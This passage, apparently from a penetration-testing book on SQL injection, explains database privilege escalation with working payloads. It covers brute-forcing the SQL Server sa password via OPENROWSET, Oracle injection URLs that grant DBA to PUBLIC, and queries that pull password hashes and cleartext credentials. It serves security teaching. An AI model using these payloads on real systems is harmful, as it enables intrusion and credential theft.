control access to the stored information by giving each user very specific rights, such as the ability to access only specific databases and perform only specific actions on it. maybe the back- end database server that you are attacking has several databases, but the user who performs your queries might have access to only one of them, which might not contain the most interesting information. or maybe your user has only read access to the data, but the aim of your test is to check whether data can be modified in an unauthorized manner. in other words, you have to deal with the fact that the user performing the queries is just a regular user, whose privileges are far lower compared to the dba’s. due to the limitations of regular users, and to fully unleash the potential of several of the attacks you have seen so far, you will need to obtain access as an administrator. luckily for us, in several cases it is possible to obtain these elevated privile ges. sql server one of an attacker’s best friends when the target is microsoft sql server is the openrowset command. openrowset is used on sql server to perform a one -time connection to a remote ole db data source (e.g. another sql server). a dba can use i t, for instance, to retrieve data that resides on a remote database, as an alternative to permanently “linking” the two databases, which is better suited to cases when the data exchange needs to be performed on a regular basis. a typical way to call openro wset is as follows: select ∗ from openrowset(‘ sqloledb’ , ‘network=dbmssocn; address=10.0.2.2;uid=foo; pwd=password’ , ‘select column1 from tablea ’) here we connected to the sql server at the address 10.0.2.2 as user foo , and we ran the query select column1 from tablea , whose results will be transferred back and returned by the outermost query. note that ‘ foo’ is a user of the database at address 10.0.2.2 and not of the database where openrowset is first executed. note also that to successfully perform the query as user ‘ foo’ we must successfully authenticate, providing the correct password. openrowset has a number of applications in sql injection attacks, and in this case we can use it to brute -force the password of the sa account. there are three important bits to remember here: • for the connection to be successful, openrowset must provide credentials that are valid on the database on which the connection is performed. • openrowset can be used not only to connect to a remote database, but also to perform a local connection, in which case the query is performed with the privileges of the user specified in the openrowset call. • on sql server 2000, openrowset can be called by all users. on sql server 2005 and 2008, it is disabled by default (but occasionally re -enabled by the dba. so always worth a try). this means that if openrowset is available, you can use it to brute -force the sa password and escalate your privileges. for example, take a look at the following query: select ∗ from openrowset(‘ sqloledb ’, ‘network=dbmssocn;address=;uid=sa;pwd=foo’, ‘select 1’) if foo is the correct password, the query will run and return 1, whereas if the password is incorrect, you will receive a message such as the following: login failed for user ‘sa’. it seems that you now ha ve a way to brute -force the sa password! fire off your favorite word list and keep your fingers crossed. if you find the correct password, you can easily escalate privileges by adding your user (which you can find with system_user) to the sysadmin group using the sp_addsrvrolemember procedure, which takes as parameters a user and a group to add the user to (in this case, obviously, sysadmin): select ∗ from openrowset(‘ sqloledb’ , ‘network=dbmssocn;address=;uid=sa;pwd=passw0rd’ , ‘select 1; exec master.dbo.sp_addsrvrolemember ‘‘appdbuser’’,‘‘sysadmin’’’) the select 1 in the inner query is necessary because openrowset expects to return at least one column. to retrieve the value of system_user , you can use one of the techniques that you saw earlier (e.g. casting its value to a numeric variable to trigger an error) or, if the application does not return enough information directly, you can use one of the blind sql injection techniques that you will see in chapter 5 . alternatively, you can inject the following query, which will perform the whole process in only one request, by constructing a string @q containing the openrowset query and the correct username, and then executing that query by passing @q to the xp_execresultset extended procedure, which on sql server 2000 can be called by all users: declare @q nvarchar(999); set @q = n‘select 1 from openrowset(‘‘sqloledb’’, ‘‘network=dbmssocn;address=;uid=sa;pwd=passw0rd’’,‘‘select 1; exec master.dbo.sp_adds rvrolemember ‘‘‘‘‘+system_user+’’’’’,‘‘‘‘sysadmin’’’’ ’’)’; exec master.dbo.xp_execresultset @q, n‘master’ warning remember that the sa account works only if mixed authentication is enabled on the target sql server. when mixed authentication is used, both windows users and local sql server users (such as sa ) can authenticate to the database. however, if windows -only authentication is configured on the remote database server, only windows users will be able to access the database and the sa account will not be available. you could technically attempt to brute -force the password of a windows user who has administrative access (if you know the user’s name), but you might block the account if a lockout policy is in place, so proceed with caution in that case. to detect which of the two possible authentication modes is in place (and therefore whether the attack can be attempted) you can inject the following code: select serverproperty(‘isintegratedsecurityonly’) this query will return 1 if windows -only authentication is in place, and 0 otherwise. of course, it would be impractical to perform a brute -force attack by hand. putting together a script that does the job in an automated way is not a big task, but there are already free tools out there that implement the whole process, such as bobcat, burp intruder, and sqlninja (all written by authors of this book). we will use sqlninja (which you can download at http://sqlninja.sourceforge.net ) for an example of this attack. first we check wheth er we have administrative privileges (the output has been reduced to the most important parts): icesurfer@psylocibe ∼ $ ./sqlninja -m fingerprint sqlninja rel. 0.2.6 copyright (c)2011 icesurfer <r00t@northernfortress.net> [+] parsing sqlninja.conf... [+] target is: www.victim.com:80 what do you want to discover ? 0 - database version (2000/2005/2008) 1 - database user 2 - database user rights 3 - whether xp_cmdshell is working 4 - whether mixed or windows- only authentication is used 5 - whether sql server runs as system (xp_cmdshell must be available) 6 - current database name a - all of the above h - print this menu q – exit > 2 [+] checking whether user is member of sysadmin server role... you are not an administrator. sqlninja uses a waitfor delay to check whether the current user is a member of the sysadmin group, and the answer is negative. we therefore feed sqlninja with a word list (the file wordlist.txt) and launch it in brute -force mode: icesurfer@psylocibe ∼ $ ./sqlninja -m bruteforce -w wordlist.txt sqlninja rel. 0.2.6 copyright (c) 2006 –2011 icesurfer <r00t@northernfortress.net> [+] parsing configuration file........... [+] target is: www.victim.com:80 [+] wordlist has been specified: using dictionary- based bruteforce [+] bruteforcing the sa password. this might take a while dba password is...: s3cr3t bruteforce took 834 seconds [+] trying to add current user to sysadmin group [+] done! new connections will be run with administrative privileges! bingo! it seems that sqlninja found the right password, and used it to add the current user to the sysadmin group, as we can easily check by rerunning sqlninja in fingerprint mode: icesurfer@psylocibe ∼ $ ./sqlninja -m fingerprint sqlninja rel. 0.2.6 copyright (c) 2006 -2011 icesur fer <r00t@northernfortress.net> [+] parsing sqlninja.conf... [+] target is: www.victim.com:80 what do you want to discover ? 0 - database version (2000/2005/2008) 1 - database user 2 - database user rights 3 - whether xp_cmdshell is working 4 - whether mixed or windows- only authentication is used 5 - whether sql server runs as system (xp_cmdshell must be available) 6 - current database name a - all of the above h - print this menu q - exit > 2 [+] checking whether user is member of sysadmin server role...you are an administrator ! it worked! our user now is an administrator, which opens up a lot of new scenarios . tools & traps... using the database’s own resources to brute- force the attack we just discussed performs one request to the back -end database for each candidate password. this means that a very large number of requests will be performed, and this in turn means that a significant amount of network resources will be needed with a large number of entries appearing on the web server and database server logs. however, this is not the only way that a brute -force attack can be performed: using a bit of sql magic, it is possible to inject a single query that independently performs the whole brute -force attack. the concept was first introduced by chris anley in his paper “(more) advanced sql injection” back in 2002, and it was then implemented by bobcat and sqlninja. bobcat, available at www.northern -monkee.co.uk , runs on windows and uses a dictionary -based approach, injecting a query that performs an out -of-band (oob) connection to the attacker’s database server to fetch a table containing a list of candidate passwords and then try them locally. we will talk about bobcat in more detail at the end of this chapter. sqlninja, when implementing this concept, uses a pure brute -force approach, injecting a query that tries every password that can be generated with a given charset and a given length. here is an example of an attack query used by sqlninja for a password of two characters on sql server 2000: declare @p nvarchar(99),@z nvarchar(10),@s nvarchar(99), @a int, @b int, @q nvarchar (4000); set @a=1; set @b=1; set @s=n‘abcdefghijklmnopqrstuvwxyz0123456789’; while @a<37 begin while @b<37 begin set @p=n’’; -- we reset the candidate password; set @z = substring(@s,@a,1); set @p=@p+@z; set @z = substring(@s,@b,1); set @p=@p+@z; set @q=n‘select 1 from openrowset(‘‘sqloledb’’, ‘‘network= dbmssocn; address=;uid=sa;pwd=‘+@p+n’’’, ‘‘select 1; exec master.dbo.sp_addsrvrolemember ‘‘‘‘‘ + system_user + n’’’’’, ‘‘‘‘sysadmin’’’’’’)’; exec master.dbo.xp_execresultset @q,n‘master’; set @b=@b+1; end; set @b=1; set @a=@a+1; end; what happens here? we start storing our character set in the variable @s, which in this case contains letters and numbers but could be extended to other symbols (if it contains single quotes, the code will need to make sure they are correctly escaped). then we create two nested cycles, controlled by the variables @a and @b that work as pointers to the character set and are used to generate each candidate password. when the candidate password is generated and stored in the variable @p, openrowset is called, trying to execute sp_addsrvrolemember to add the current user ( system_user ) to the administrative group ( sysadmin ). to avoid the query stopping in case of unsuccessful authentication of openrowset , we store the query into the variable @q and execute it wit h xp_execresultset . it might look a bit complicated, but if the administrative password is not very long it is a very effective way for an attacker to escalate his privileges. moreover, the brute -force attack is performed by using the database server’s own cpu resources, making it a very elegant way to perform a privilege escalation. however, be very careful when using this technique against a production environment, as it can easily push the cpu usage of the target system up to 100% for the whole time, pos sibly decreasing the quality of services for legitimate users. as you have seen, openrowset is a very powerful and flexible command that can be abused in different ways, from transferring data to the attacker’s machine to attempting a privilege escalation. this is not all, however: openrowset can also be used to look for sql server installations that have weak passwords. have a look at the following query: select ∗ from openrowset(‘ sqloledb’ , ‘network=dbmssocn; address=10.0.0.1;uid=sa; pwd=’ , ‘select 1’ ) this query will attempt to authenticate to an sql server at the address 10.0.0.1 as sa using an empty password. it is quite easy to create a cycle that will try such queries on all of the ip addresses of a network segment, saving the results in a temporary t able that you can extract at the end of the process using one of the methods you have seen so far. if you are dealing with sql server 2005 or 2008 and you don’t have administrative privileges, checking for the availability of openrowset should be one of your first tests. you can perform the check using the following query: select value_in_use from sys.configurations where name like ‘ad hoc%’ if openrowset is available, this query will return 1, and 0 otherwise. privilege escalation on unpatched servers openrowset is not the only privilege escalation vector on sql server: if your target database server is not fully updated with the latest security patches, it might be vulnerable to one or more well -known attacks. sometimes network administrators do not have the resources to ensure that all the servers on their networks are constantly updated. other times, they simply lack the awareness to do so. yet other times, if the server is particularly critical and the security fix has not been carefully tested in an isolated environment, the update process could be kept on hold for days or even weeks, leaving the attacker with a window of opportunity. in these cases, a precise fingerprinting of the remote server is paramount in determining which flaws might be present and whether they can be safely exploited. a very good example is ms09- 004, a heap overflow found by bernhard mueller in the sp_replwritetovarbin stored procedure on sql server 2000 and 2005. when successfully exploited, it enables the attacker to run arbitrary code with administrative privileges on the affected host; exploit code was made publicly available shortly after the vulnerability was published. you can exploit the vulnerability through sql injection by in jecting a malicious query that calls sp_replwritetovarbin , overflowing the memory space and executing the malicious shell code. however, a failed exploitation can cause a denial of service (dos) condition, so be careful if you attempt this attack! especial ly starting with windows 2003, data execution prevention (dep) is enabled by default, meaning that the operating system will stop any attempt to execute code in areas of memory not allocated to code, and it will do this by killing the offending process (sq lservr.exe in this case). more information about this vulnerability is available at www.securityfocus.com/bid/32710, and sqlmap has a module to exploit this vulnerability. another scenario is the following: your queries might be executed as ‘sa’, but the sqlservr.exe process runs as a low -privileged account, which might stop you from carrying out some specific attacks, for instance using sqlninja to inject the vnc dll from metasploit and obtain gui acce ss to the database server (see chapter 6 for more information on this). in this case, if the operating system is not fully patched you can try exploiting it in order to elevate the privileges of sql server. techniques to achieve this include token kidnaping ( www.argeniss.com/research/tokenkidnapping.pdf ) and successful exploitation of cve -2010- 0232. both sqlninja and sqlmap can help you in automating t hese attacks. as an example, let’s see sqlninja at work with the more recent cve -2010 -0232. sqlninja is shipped with a customized version of the original exploit by tavis ormandy. when the exploit is called with the “sql” parameter, it will look for the sq lservr.exe process and elevate its privileges to system. in order to perform the attack, you will need to perform the following: • use the fingerprint mode ( -m fingerprint) to check that xp_cmdshell is working (option 3) and that sqlservr.exe does not run as system (option 5). • use the upload mode ( -m upload) to transfer vdmallowed.exe (option 5) and vdmexploit.dll (option 6) to the remote server. • use the command mode ( -m command) to execute the exploit by running “%temp% \\\\vdmallowed.exe sql” (without quotes). if the remote windows server is not patched against this vulnerability, the fingerprint mode will now confirm that sql server is now running as system! sqlmap also provides full support for this attack, via metasploit’s getsystem command. oracle privilege escalation via web application sql injection in oracle can be quite difficult because most approaches for privilege escalation attacks require pl/sql injection, which is less common, however if we have access to dbms_xmlquery.newcontext() or dbms_xmlquery.getxml() (accessible to public by default), as discussed earlier in “hacking oracle web applications,” we can perform injection via anonymous pl/sql code blocks. one example not requiring pl/sql injection uses a vulnerability found in the oracle component mod_plsql . the following url shows a privilege escalation via the driload package (found by alexander kornbrust). this package was not filtered by mod_plsql and allowed any web user a privilege escalation by entering the following url: http://www .victim.com/pls/dad/ctxsys.driload.validate_stmt?sqlstmt=grant+dba+to+public most pl/sql privilege escalation exploits (many available on www.milw0rm.com ) use the following concept: 1. create a payload which grants db a privileges to the public role. this is less obvious than granting dba privileges to a specific user. this payload will be injected into a vulnerable pl/sql procedure in the next step: create or replace function f1 return number authid current_user as pragma autonomous_transaction; begin execute immediate ‘grant dba to public’; commit; return 1; end; / 2. inject the payload into a vulnerable package: exec sys.kupw$worker.main(‘x’,‘yy’’ and 1=user12.f1 -- mytag12’); 3. enable the dba role: set role dba; 4. revoke the dba role from the public role: revoke dba from public; the current session still has dba privileges, but this will no longer be visible in the oracle privilege tables. some example privilege escalation vulnerabilities in oracle are sys.lt and sys.dbms_cdc_publish, which are both discussed below. sys.lt if the database user has the create procedure privilege than we can create a malicious function within the user’s schema and inject the function within a vulnerable object of the sys.lt package (fi xed by oracle in april 2009). the end result is that our malicious function gets executed with sys permissions and we get dba privileges: -- create function http://www.victim.com/index.jsp?id=1 and (select dbms_xmlquery.newcontext(‘declare pragma autonomous_transaction; begin execute immediate ‘‘create or replace function pwn2 return varchar2 authid current_user is pragma autonomous_transaction;begin execute immediate ‘‘‘‘grant dba to public’’’’;commit;return ‘‘‘‘z’’’’;end; ’’; commit; end;’) from dual) is not null - -- exploiting sys.lt http://www.victim.com/index.jsp?id=1 and (select dbms_xmlquery.newcontext(‘declare pragma autonomous_transaction; begin execute immediate ‘‘ begin sys.lt.createworkspace(‘‘‘‘a10‘‘‘‘‘‘‘‘ and scott.pwn2()=’’’’’’’’x’’’’);sys.lt.removeworkspace(‘‘‘‘a10‘‘‘‘‘‘‘‘ and scott.pwn2()=’’’’’’’’x’’’’);end;’’; commit; end;’) from dual) is not null – sys.dbms_cdc_publish another more recent issue that was fixed by oracle in october 2010 (in versions 10gr1, 10gr2, 11gr1, and 11gr2) is found in the package sys.dbms_cdc_publi sh.create_change_set, which allows a user with the privilege execute_catalog_role to become dba: http://www.victim.com/index.jsp?id=1 and (select dbms_xmlquery.newcontext(‘declare pragma autonomous_transaction; begin execute immediate ‘‘ begin sys.dbms_cdc_publish.create_change_set(‘‘‘‘a’’’’,‘‘‘‘a’’’’,‘‘‘‘a‘‘‘‘‘‘‘‘||scott.pwn2()||’’’’’’’’a’’’’,‘‘‘‘y’’’’,sysdate,sysdate);end;’’; commit; end;’) from dual) is not null - getting past the create procedure privilege one of the disadvantages of this approach is t he requirement of having the create procedure privilege. in scenarios where our user doesn’t have this privilege, we can overcome this hurdle by taking advantage of one of the following techniques and common issues. cursor injection david litchfield presen ted a solution to this problem at the blackhat dc 2009 conference. in oracle 10g, we can get past the problem of create function by using cursors to inject pl/sql as follows: http://www.victim.com/index.jsp?id=1 and (select dbms_xmlquery.newcontext(‘declare pragma autonomous_transaction; begin execute immediate ‘‘declare d number;begin d:= dbms_sql.open_cursor; dbms_sql.parse(d,‘‘‘‘declare pragma autonomous_transaction; begin execute immediate ‘‘‘‘‘‘‘‘grant dba to public’’’’’’’’;commit;end;’’’’,0);sys.lt.cr eateworkspace(‘‘‘‘a’’’’’’’’ and dbms_sql.execute(‘‘‘‘||d||’’’’)=1-- ’);sys.lt.compressworkspacetree(‘‘‘‘a’’’’’’’’ and dbms_sql.execute(‘‘‘‘||d||’’’’)=1-- ’’’’);end;’’; commit; end;’) from dual) is not null -- note that this cursor injection technique is not possible in oracle 11g and later. sys.kupp$proc another function that comes with oracle that allows you to execute any pl/sql statement is sys.kupp$proc.create_master_process(). note that this function is only executable by users with the dba role, however in instances where we have identified a vulnerable procedure we can use this to execute pl/sql as shown below: select dbms_xmlquery.newcontext(‘declare pragma autonomous_transaction; begin execute immediate ‘‘ begin sys.vulnproc(‘‘‘‘a‘‘‘‘‘‘‘‘||sys.kupp$proc.create_master_process(‘‘‘‘‘‘‘‘execute immediate ‘‘‘‘‘‘‘‘‘‘‘‘‘‘‘‘declare pragma autonomous_transaction; begin execute immediate ‘‘‘‘‘‘‘‘‘‘‘‘‘‘‘‘‘‘‘‘‘‘‘‘‘‘‘‘‘‘‘‘grant dba to public’’’’’’’’’’’’’’’’’’’’’’’’’’’’’’’’; end; ’’’’’’’’’’’’’’’’;’’’’’’’’)||’’’’’’’’a’’’’);end;’’; commit; end;’) from dual weak permissions it is common to see database permissions being overlooked, and often database users may have permissions which could indirectly allow privilege escalation attacks. some of these permissions are: • create any view • create any trigger • create any procedure • execute any procedure the main reason why these privileges are dangerous is that they allow the grantee to create objects (views, triggers, procedures, etc.) in the schema of other users, including the system schema. these objects, when executed, execute with the privilege of owner and hence allow for privilege escalation. as an example, if the database user had create any trigger permission then they could use this to grant themself the dba role. first, we can make our user create a trigger within the system schema. the trigger, when invoked will execute the ddl statement grant dba to public: select dbms_xmlquery.newcontext(‘declare pragma autonomous_transaction; begin execute immediate ‘‘create or replace trigger “system”.the_trigger before insert on system.ol$ for each row declare pragma autonomous_transaction; begin execute immediate ‘‘‘‘grant dba to public’’’’; end the_trigger;’’;end;’) from dual notice that the trigger is invoked when an insert is made on the table system.ol$, which is a special table with public having insert rights on this table. now, we can do an insert on this table and the end result is that the trigger system.the_trigger gets executed with system privileges granting dba role to public: select dbms_xmlquery.newcontext(‘declare pragma autonomous_transaction; begin execute immediate ‘‘ insert into system.ol$(ol_name) values (‘‘‘‘job done!!!’’’’) ’’;end;’)from dual stealing the password hashes we briefly talked about hashing functions earlier in this chapter, when we discussed a successful attack that recovered the passwords of the application users. in this section, we’ll talk about hashes again, this time regarding the database users. on all common database server technologies, user passwords are stored using a non- reversible hash (the exact algorithm used varies depending on the database server and version, as you will se e shortly) and such hashes are stored, you guessed it, in a database table. to read the contents of that table you normally will need to run your queries with administrative privileges, so if your user does not have such privileges you should probably return to the privilege escalation section. if you manage to capture the password hashes, various tools can attempt to retrieve the original passwords that generated the hashes by means of a brute -force attack. this makes the database password hashes one of the most common targets in any attack: because users often reuse the same password for different machines and services, being able to obtain the passwords of all users is usually enough to ensure a relatively easy and quick expansion in the target network. sql server if you are dealing with a microsoft sql server, things vary quite a lot depending on the version you are dealing with. in all cases, you need administrative privileges to access the hashes, but differences start to surface when you actually try t o retrieve them and, more importantly, when you try to crack them to obtain the original passwords. on sql server 2000, hashes are stored in the sysxlogins table of the master database. you can retrieve them easily with the following query: select name,password from master.dbo.sysxlogins such hashes are generated using pwdencrypt() , an undocumented function that generates a salted hash, where the salt is a function of the current time. for instance, here is the hash of the sa password on one of the sql servers that i use in my tests: 0x0100e21f79764287d299f09fd4b7ec97139c7474ca1893815231e9165d257aceb815111f2ae98359f40f84f3cf 4c this hash can be split into the following parts: • 0x0100: header • e21f7976: salt • 4287d299f09fd4b7ec97139c7474ca1893815231: case- sensitive hash • e9165d257aceb815111f2ae98359f40f84f3cf4c: case -insensitive hash each hash is generated using the user’s password and the salt as input for the sha1 algorithm. david litchfield performed a full analysis of the hash generation of sql server 2000, and it is available at the address www.nccgroup.com/libraries/document_downloads/microsoft_sql_server_passwords_cracking_the_password_hashes.sflb.ashx . what is interesting to us is the fact that on sql server 2000 passwords are case -insensitive, which simplifies the job of cracking them. to crack the hashes you can use the tools ngssqlcrack (www.ngssecure.com/services/information -security -software/ngs -sqlcrack.aspx ) or cain & abel ( www.oxid.it/cain.html ). when developing sql s erver 2005 (and consequently sql server 2008), microsoft took a far more aggressive stance in terms of security, and implementation of the password hashing clearly shows the paradigm shift. the sysxlogins table has disappeared, and hashes can be retrieved by querying the sql_logins view with the following query: select password_hash from sys.sql_logins here’s an example of a hash taken from sql server 2005: 0x01004086ceb6a15ab86d1cbdea98deb70d610d7fe59edd2fec65 the hash is a modification of the old sql server 2000 hash: • 0x0100: header • 4086ceb6: salt • a15ab86d1cbdea98deb70d610d7fe59edd2fec65: case- sensitive hash as you can see, microsoft removed the old case -insensitive hash. this means your brute force attack will have to try a far larger number of password candidates to succeed. in terms of tools, ngssqlcrack and cain & abel are still your best friends for this attack. depending on a number of factors, when retrieving a password hash the web application might not always return the hash in a nice hexadecimal format. it is therefore recommended that you explicitly cast its value into a hex string using the function fn_varbintohexstr() . for instance: http://www.victim.com/products.asp?id=1+union+select+master.dbo.fn_varbintohexstr(password_h ash)+from+sys.sql_logins+where+name+=+‘sa’ mysql mysql stores its password hashes in the mysql.user table. here is the query to extract them (together with the usernames they belong to): select user,password from mysql.user; password hashes are calculated using the password() function, but the exact algorithm depends on the version of mysql that is installed. before 4.1, a simple 1 6-character hash was used: mysql> select password(‘password’) +---------------------- + | password(‘password’) | +---------------------- + | 5d2e19393cc5ef67 | +---------------------- + 1 row in set (0.00 sec) starting with mysql 4.1, the password() function was modified to generate a far longer (and far more secure) 41 -character hash, based on a double sha1 hash: mysql> select password(‘password’) +------------------------------------------- + | password(‘password’) | +----------------------------------------- --+ | ∗2470c0c06dee42fd1618bb99005adca2ec9d1e19 | +-------------------------------------------+ 1 row in set (0.00 sec) note the asterisk at the beginning of the hash. it turns out that all password hashes generated by mysql (4.1 or later) start with an asterisk, so if you stumble into a hexadecimal string that starts with an asterisk and is 41 characters long, it’s likely there is a mysql installation in the neighborhood. once you have captured the password hashes, you can attempt to recover the original passwords with john the ripper ( www.openwall.com/john/ ) or cain & abel ( www.oxid.it ). if the hashes you have extracted come from an installation of mysql 4.1 or later, you need to patch john the ripper with the “john bigpatch,” which you can find at www.banquise.net/misc/patch- john.html . postgresql if you happen to have administrative privileges, and therefore you can access the table pg_shadow, you can easily extract the password hashes with one of the following queries: select usename , passwd from pg_shadow select rolname, rolpassword from pg_authid with postgresql passwords are by default hashed with md5, which makes a brute -force attack very efficient. however, keep in mind that postgresql concatenates the password and the username before the hash function is called. also, the string ‘md5’ is prepended to the hash. in other words, if the username is ‘bar’ and the password is ‘foo,’ the hash will be the following: hash = ‘md5’ || md5(‘foobar’) = md53858f62230ac3c915f300c664312c63f you might wonder why postgresql needs to prepend the string ‘md5’ to the hash: that is for being able to tell whether the value is a hash or the password itself. yes, you got this right: postgresql allows for the password to be stored in clear text with the following query: alter user username unencrypted password ‘letmein’ oracle oracle stores its password hashes for database accounts in the password column of the sys.user$ table. the dba_users view points to this table, but since oracle 11g the data encryption standard (des) password hashes are no longer visible in the dba_users view. the sys.user$ table contains the password hashes of database users ( type#=1 ) and database roles (type#=0 ). with oracle 11g, oracle introduced a new way of hashing oracle passwords (sha1 instead of des) and support for mixed- case characters in passwords. the old des hashes represent case- insensitive uppercase passwords, making them relatively easy to crack. the new hashes in 11g are stored in the same table but in a different column, called spare4. by default, oracle 11g saves the old (des) and the new (sha1) password hashes in the same table, so an attacker has a choice between cracking old or new passwords. queries for extracting password hashes (together with the usernames they belong to) are as follows. for oracle des user passwords: select use rname,password from sys.user$ where type#>0 andlength(password)=16 for oracle des role passwords: select username,password from sys.user$ where type#=1 andlength(password)=16 for oracle sha1 passwords (11g+): select username, substr(spare4,3,40) hash, substr(spare4,43,20) salt fromsys.user$ where type#>0 and length(spare4)=62; various tools (checkpwd, cain & abel, john the ripper, woraauthbf, gsauditor, and orabf) are available for cracking oracle passwords. the fastest tools so far for oracle des passwords are woraauthbf, from lászló tóth, and gsauditor for sha1 oracle hashes. refer to figure 4.15 for examples of oracle hashes being returned via sql injection. figure 4.15 oracle hash examples many other tables in the oracle database (installed by oracle itself) also contain password hashes, encrypted passwords, or sometimes even clear -text passwords. often, it is easier to retrieve the (clear -text) password instead of cracking it. one example where you often can find the clear -text password of the sys user is the sysman.mgmt_credentials2 table. during installation oracle asks whether the installer wants to use the same password for all dba accounts. oracle saves the encrypted password of user dbsnmp (which is identical to sys and system) in the mgmt_credentials2 table if the answer was “yes.” by accessing this table, it is often possible to get the sys/system password. here are some sql statements that will often return clear -text passwords: -- get the cleartext password of the user mgmt_view (generated by oracle -- during the installation time, looks like a hash but is a password) select view_username, sysman.decrypt(view_password) password from sysman.mgmt_view_user_credentials; -- get the password of the dbsnmp user, databases listener and os -- credentials select sysman.decrypt(t1.credential_value) sysmanuser, sysman.decrypt(t2.credential_value) password from sysman.mgmt_credentials2 t1, sysman.mgmt_credentials2 t2 where t1.credential_guid=t2.credential_guid and lower(t1.credential_set_column)=‘username’ and lower(t2.credential_set_column)=‘password’ -- get the username and password of the oracle knowledgebase metalink select sysman.decrypt(aru_username), sysman.decrypt(aru_password) from sysman.mgmt_aru_credentials; oracle components several oracle components an d products come with their own user management (e.g. oracle internet directory) or they save passwords in various other tables, in more than 100 different tables in all. the following subsections discuss some of the types of hashes you might be able to fin d within the database with other oracle products. apex newer oracle database installations often contain oracle application express (apex). in 11g, this component (apex 3.0) is installed by default. this web application framework comes with its own (lightw eight) user management. the password hashes (md5 until version 2.2, salted md5 since version 3.0) of this product are located in the flows_xxyyzz schema in the wwv_flow_fnd_user table. different versions of apex use different schema names, with the schema name containing the version number of apex (e.g. 020200 for apex 2.2): select user_name,web_password_raw from flows_020000.wwv_flow_fnd_user; select user_name,web_password_raw from flows_020100.wwv_flow_fnd_user; select user_name,web_password_raw from flows_020200.wwv_flow_fnd_user; since apex 3.0, the md5 passwords are salted with the security_group_id and the username , and are returned as follows: select user_name,web_password2,security_group_id from flows_030000.wwv_flow_fnd_user; select user_name,web_pa ssword2,security_group_id from flows_030000.wwv_flow_fnd_user; oracle internet directory oracle internet directory (oid), the oracle lightweight directory access protocol (ldap) directory, comes with many hashed passwords in various tables. you can access the password hashes of oid if you have normal access to all users in the company. for compatibility reasons, oid saves the same user password with different hashing algorithms (md4, md5, and sha1). the following statements return the password hashes of oid users: select a.attrvalue ssouser, substr(b.attrval,2,instr(b.attrval,‘}’)- 2) method, rawtohex(utl_encode.base64_decode(utl_raw.cast_to_raw(substr (b.attrval,instr(b.attrval,‘}’)+1)))) hash from ods.ct_cn a,ods.ds_attrstore b where a.entryid=b.entryid and lower(b.attrname) in ( ‘userpassword’,‘orclprpassword’,‘orclgupassword’,‘orclsslwalletpasswd’, ‘authpassword’,‘orclpassword’) and substr(b.attrval,2,instr(b.attrval,‘}’)- 2)=‘md4’ order by method,ssouser; select a.attrvalue ssouser, substr(b.attrval,2,instr(b.attrval,‘}’)- 2) method, rawtohex(utl_encode.base64_decode(utl_raw.cast_to_raw(substr (b.attrval,instr(b.attrval,‘}’)+1)))) hash from ods.ct_cn a,ods.ds_attrstore b where a.entryid=b.entryid and lower(b.attrname) in ( ‘userpassword’,‘orclprpassword’,‘orclgupassword’,‘orclsslwalletpasswd’, ‘authpassword’,‘orclpassword’) and substr(b.attrval,2,instr(b.attrval,‘}’)- 2)=‘md5’ order by method,ssouser; select a.attrvalue ssouser, substr(b.attrval,2,instr(b.attrval,‘}’)- 2) method, rawtohex(utl_encode.base64_decode(utl_raw.cast_to_raw(substr (b.attrval,instr(b.attrval,‘}’)+1)))) hash from ods.ct_cn a,ods.ds_attrstore b where a.entryid=b.entryid and lower(b.attrname) in ( ‘userpassword’,‘orclprpassword’,‘orclgupassword’,‘orclsslwalletpasswd’, ‘authpassword’,‘orclpassword’) and substr(b.attrval,2,instr(b.attrval,‘}’)- 2)=‘sha’ order by method,ssouser; additional details and tools for cracking oracle passwords are available at the following sites: • www.red -database- security.com/whitepaper/oracle_passwords.html • www.red -database- security.com /software/checkpwd.html • www.evilfingers.com/tools/gsauditor.php (download gsauditor) • www.soonerorlater.hu/index.khtml? article_id=513 (download woraauthbf) out-of-band communication although the different exploitation techniques we’ve covered in this chapter vary in terms of exploitation method and desired result, they all have something in common: the query and the result s are always transmitted on the same communication channel. in other words, the http(s) connection that is used to send the request is also used to receive the response. however, this does not always have to be the case: the results can be transferred acro ss a completely different channel, and we refer to such a communication as “out of band,” or simply oob. what we leverage here is that modern database servers are very powerful applications, and their features go beyond simply returning data to a user perf orming a query. for instance, if they need some information that resides on another database, they can open a connection to retrieve that data. they can also be instructed to send an e -mail when a specific event occurs, and they can interact with the file system. all of this functionality can be very helpful for an attacker, and sometimes they turn out to be the best way to exploit an sql injection vulnerability when it is not possible to obtain the query results directly in the usual http communication. sometimes such functionality is not available to all users, but we have seen that privilege escalation attacks are not just a theoretical possibility. there are several ways to transfer data using an oob communication, depending on the exact technology used in the back -end and on its configuration. a few techniques will be illustrated here, and some more in chapter 5 , when talking specifically about blind sql injection, but the examples cannot cover all possibilities. so, if you are not able to extract data using a normal http connection and the database user that is performing the queries is powerful enough, use your creativity: an oob communication can be the fastest way to successfully exploit the vulnerable application. e-mail databases are very often critical parts of any infrastructure, and as such it is of the utmost importance that their administrators can quickly react to any problem that might arise. this is why most modern database servers offer some kind of e -mail functionality that can be used to automatically send and receive e- mail messages in response to certain situations. for instance, if a new application user is added to a company’s profile the company administrator might be notified by e -mail automatically as a security precaution. the configuration of how to send the e-mail in this case is already completed; all an attacker needs to do is construct an exploit that will extract interesting information, package the data in an e -mail, and queue the e -mail u sing database -specific functions. the e -mail will then appear in the attacker’s mailbox. microsoft sql server as is often the case, microsoft sql server provides a nice built -in feature for sending e -mails. actually, depending on the sql server version, there might be not one, but two different e mailing subsystems: sql mail (sql server 2000, 2005, and 2008) and database mail (sql server 2005 and 2008). sql mail was the original e -mailing system for sql server. microsoft announced with the release of sql se rver 2008 that this feature has been deprecated, and will be removed in future versions. it uses the messaging application programming interface (mapi), and therefore it needs a mapi messaging subsystem to be present on the sql server machine (e.g. microso ft outlook, but not outlook express) to send e -mails. moreover, the e -mail client needs to be already configured with the post office protocol 3/simple mail transfer protocol (pop3/smtp) or exchange server to connect to, and with an account to use when connected. if the server you are attacking has sql mail running and configured, you only need to give a try to xp_startmail (to start the sql client and log on to the mail server) and xp_sendmail (the extended procedure to send an e -mail message with sql mail). xp_startmail optionally takes two parameters ( @user and @password) to specify the mapi profile to use, but in a real exploitation scenario it’s quite unlikely that you have this information, and in any case you might not need it at all: if such paramete rs are not provided, xp_startmail tries to use the default account of microsoft outlook, which is what is typically used when sql mail is configured to send e -mail messages in an automated way. regarding xp_sendmail , its syntax is as follows (only the most relevant options are shown): xp_sendmail { [ @recipients= ] ‘recipients [;...n ]’ }[,[ @message= ] ‘message’ ] [,[ @query= ] ‘query’ ] [,[ @subject= ] ‘subject’ ] [,[ @attachments= ] 